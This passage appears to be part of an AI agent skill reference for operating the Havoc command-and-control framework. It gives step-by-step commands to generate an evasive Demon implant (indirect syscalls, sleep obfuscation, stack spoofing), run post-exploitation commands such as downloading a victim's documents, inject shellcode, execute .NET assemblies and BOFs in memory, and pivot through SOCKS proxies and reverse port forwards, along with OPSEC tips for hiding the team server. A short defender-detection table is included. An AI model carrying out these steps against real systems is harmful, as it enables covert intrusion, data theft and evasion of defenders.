# operating-havoc-c2 — 详细参考（由 SKILL.md 拆分）

# Add debug logging
./havoc server --profile profiles/engagement.yaotl --verbose --debug
```

### Step 3: Connect with the client

Launch the Qt client and connect to the team server using the operator credentials from the profile:

```bash
./havoc client
```

In the connect dialog: enter the team server host, port `40056`, operator name `operator1`, and the profile password. The Demon panel and listener views appear once connected.

### Step 4: Create / verify a listener

The HTTP listener defined in the profile loads automatically. To add another at runtime use **Listeners → Add** in the GUI and configure: Name, Hosts (callback domains/IPs), HostBind, PortBind, PortConn, and whether it is Secure (HTTPS).

### Step 5: Generate a Demon agent

In the GUI go to **Attack → Payload** and configure the Demon build:

- **Listener:** `https-listener`
- **Architecture:** `x64`
- **Format:** `Windows Exe`, `Windows Dll`, or `Windows Shellcode`
- **Sleep:** e.g., `30` seconds with jitter
- **Indirect Syscalls:** Enabled (Hell's Gate / Halo's Gate)
- **Sleep Technique:** `Ekko` (encrypts agent memory during sleep)
- **Stack Spoofing / Proxy Loading:** Enabled
- **Sleep Jmp Gadget:** as available

Click **Generate** to produce the payload. Deliver it to the target through your authorized initial-access method.

### Step 6: Interact with the Demon

When a Demon checks in it appears in the session table. Right-click → **Interact** (or double-click) to open the console. Core post-exploitation commands:

```
# Situational awareness
whoami
pwd
ls
ps
ipconfig
net localgroup administrators

# Token / privilege
getprivs
token list

# File operations
download C:\Users\victim\Documents\secrets.docx
upload /opt/tools/tool.exe C:\Windows\Temp\tool.exe
```

### Step 7: In-memory execution (.NET and BOFs)

The Demon supports in-memory execution of .NET assemblies and Beacon Object Files, avoiding disk writes:

```
# Execute a .NET assembly in-memory (e.g., Seatbelt, Rubeus)
dotnet inline-execute /opt/tools/Seatbelt.exe -group=system

# Run a Beacon Object File
inline-execute /opt/bofs/whoami.o
```

### Step 8: Process injection and migration

```
# Inject shellcode into a spawned/target process
shellcode inject x64 PID /tmp/payload.bin

# Run an assembly under a sacrificial process per profile Injection settings
proc create C:\Windows\System32\notepad.exe
```

### Step 9: Pivot into segmented networks

```
# Start a SOCKS5 proxy through the Demon for proxychains tooling
socks add 1080

# Port forward (reverse) to reach an internal service
rportfwd add 8443 10.0.5.20 443
```

### Step 10: Clean up

```
# Remove uploaded artifacts and exit the agent cleanly
rm C:\Windows\Temp\tool.exe
exit
```

Stop the team server (`Ctrl-C`) and revoke operator credentials at engagement end.

## Tools and Resources

| Resource | Purpose | Link |
|----------|---------|------|
| Havoc Framework | Source and releases | https://github.com/HavocFramework/Havoc |
| Havoc Documentation | Official docs (teamserver, profiles, agent) | https://havocframework.com/docs |
| Havoc Profiles | Sample Yaotl profiles | https://github.com/HavocFramework/Havoc/tree/main/profiles |
| MITRE ATT&CK T1071.001 | Web Protocols | https://attack.mitre.org/techniques/T1071/001/ |

## OPSEC and Detection Considerations

| Demon feature | Purpose | Defender detection opportunity |
|---------------|---------|--------------------------------|
| Indirect syscalls (Hell's/Halo's Gate) | Bypass user-mode API hooks | Kernel ETW (Threat-Intelligence provider), call-stack anomalies |
| Sleep obfuscation (Ekko) | Encrypt agent in memory while sleeping | Memory scanning between sleeps, timer-queue/ROP artifacts |
| Stack spoofing | Hide implant in call stacks | Unbacked-memory thread start, spoofed-frame heuristics |
| HTTP(S) C2 | Blend with web traffic | Beaconing periodicity, JA3/TLS fingerprint, malleable headers |

- Tune `Sleep` and `Jitter` high to reduce beacon regularity.
- Front HTTP(S) listeners with nginx/Apache redirectors; never expose the team server IP.
- Prefer in-memory `dotnet inline-execute` / BOFs over spawning child processes.

## Validation Criteria

- [ ] Havoc team server and client built from source successfully
- [ ] Yaotl profile authored with team server, operator, and HTTP(S) listener
- [ ] Team server launched with the profile and operator connected via client
- [ ] HTTP(S) listener active
- [ ] Evasive Demon agent generated with sleep obfuscation and indirect syscalls
- [ ] Demon checks in and post-exploitation commands run
- [ ] A .NET assembly or BOF executed in-memory
- [ ] SOCKS proxy or port-forward established for pivoting
- [ ] Artifacts removed, agent exited, and team server stopped at cleanup
